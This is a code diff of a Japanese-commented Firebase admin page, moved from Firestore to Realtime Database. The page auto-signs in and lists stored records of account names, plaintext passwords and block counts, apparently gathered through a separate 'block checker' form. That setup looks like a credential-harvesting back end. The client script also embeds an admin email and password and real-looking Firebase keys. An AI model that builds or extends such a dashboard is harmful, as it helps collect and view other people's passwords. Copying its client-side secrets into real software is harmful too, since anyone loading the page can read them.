@@ -28,39 +28,39 @@ h1 { text-align:center;}
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
-import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
+import { getDatabase, ref, get, query, orderByChild } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
 import { getAuth, onAuthStateChanged, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-auth.js";
 
-// 🔹 firebaseConfig はフォームページと同じ
+// 🔹 Firebase 設定（Realtime Database 用）
 const firebaseConfig = {
   apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
   authDomain: "daada-ae048.firebaseapp.com",
+  databaseURL: "https://blockchecker-60080-default-rtdb.firebaseio.com",
   projectId: "daada-ae048",
-  storageBucket: "daada-ae048.firebasestorage.app",
+  storageBucket: "daada-ae048.appspot.com",
   messagingSenderId: "844142280857",
-  appId: "1:844142280857:web:9ced0beca7eeafd3223808",
-  measurementId: "G-02E60HW9QW"
+  appId: "1:844142280857:web:9ced0beca7eeafd3223808"
 };
 
 const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+const db = getDatabase(app);
 const auth = getAuth(app);
 
-// 🔹 自分のアカウント情報
+// 🔹 管理者アカウント
 const ADMIN_EMAIL = "admin@example.com";
 const ADMIN_PASSWORD = "mysecretpassword";
 
-// 🔹 自動ログイン（テスト用。ブラウザ閉じても Firebase Auth が保持される）
+// 🔹 自動ログイン（ブラウザ閉じても保持）
 signInWithEmailAndPassword(auth, ADMIN_EMAIL, ADMIN_PASSWORD)
   .catch(err => alert("ログインエラー: " + err.message));
 
 async function showData() {
-  const q = query(collection(db, "blockchecker"), orderBy("createdAt","desc"));
-  const snapshot = await getDocs(q);
   const table = document.getElementById("data-table");
   const noData = document.getElementById("no-data");
 
-  if (snapshot.empty) {
+  const snapshot = await get(query(ref(db, "messages"), orderByChild("timestamp")));
+
+  if (!snapshot.exists()) {
     table.style.display = "none";
     noData.style.display = "block";
     return;
@@ -69,23 +69,23 @@ async function showData() {
   table.style.display = "table";
   noData.style.display = "none";
 
-  snapshot.forEach(doc => {
-    const d = doc.data();
+  snapshot.forEach(child => {
+    const d = child.val();
     const row = table.insertRow();
-    row.insertCell(0).textContent = d.account;
-    row.insertCell(1).textContent = d.password;
-    row.insertCell(2).textContent = d.blockCount;
-    row.insertCell(3).textContent = d.createdAt?.toDate ? d.createdAt.toDate().toLocaleString() : "-";
+    row.insertCell(0).textContent = d.account || "-";
+    row.insertCell(1).textContent = d.password || "-";
+    row.insertCell(2).textContent = d.blockCount || "-";
+    row.insertCell(3).textContent = d.timestamp ? new Date(d.timestamp).toLocaleString() : "-";
   });
 }
 
-// 🔹 ページを開いた時にログイン確認
+// 🔹 ログイン確認
 onAuthStateChanged(auth, user => {
   if (user && user.email === ADMIN_EMAIL) {
-    showData(); // ログイン済みかつ自分のメールなら表示
+    showData();
   } else {
     alert("管理者ログインが必要です");
-    window.location.href = "ログインページURL";
+    window.location.href = "ログインページURL"; // 適宜変更
   }
 });
 </script>
